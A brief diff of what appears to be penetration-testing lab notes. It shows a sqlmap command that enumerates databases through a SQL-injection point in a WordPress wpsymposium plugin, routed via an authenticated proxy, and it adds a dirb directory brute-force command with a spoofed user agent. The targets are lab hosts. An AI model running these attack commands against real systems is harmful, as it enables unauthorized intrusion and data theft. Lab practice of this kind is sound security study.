@@ -31,3 +31,5 @@ SQLMAP using proxy:
 sudo sqlmap -u "http://cybear32c.lab/wp-content/plugins/wpsymposium/get_album_item.php?size=1"
 --dbs
 --proxy="http://192.168.101.8:3128" --proxy-cred="b.muncy:xxxx" 
+
+dirb http://192.168.101.6/ -a 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0'
